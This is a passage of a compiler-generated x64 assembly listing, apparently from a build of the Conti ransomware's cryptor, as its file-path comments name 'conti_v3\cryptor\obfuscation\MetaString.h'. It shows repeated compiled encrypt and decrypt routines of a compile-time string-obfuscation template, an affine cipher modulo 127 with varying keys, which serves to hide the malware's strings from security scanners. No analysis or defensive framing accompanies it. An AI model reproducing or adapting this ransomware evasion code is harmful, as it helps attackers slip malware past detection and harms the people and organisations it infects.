  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0d	 imul	 r8d, eax, 13
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 30	 add	 r8d, 48			; 00000030H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 0b	 sub	 eax, 11
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0b	 add	 r8d, 11
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 02	 sub	 eax, 2
  00006	44 8d 04 c0	 lea	 r8d, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 71	 imul	 r8d, eax, 113		; 00000071H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 02	 add	 r8d, 2
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 69 00 00 00	 mov	 ecx, 105		; 00000069H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 0b	 imul	 r8d, ecx, 11

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 17	 imul	 r8d, eax, 23
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 69	 add	 r8d, 105		; 00000069H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ PROC ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ ENDP ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1a 00 00 00	 mov	 ecx, 26
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1a	 add	 r8d, 26
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 65	 sub	 eax, 101		; 00000065H
  00006	44 6b c0 33	 imul	 r8d, eax, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
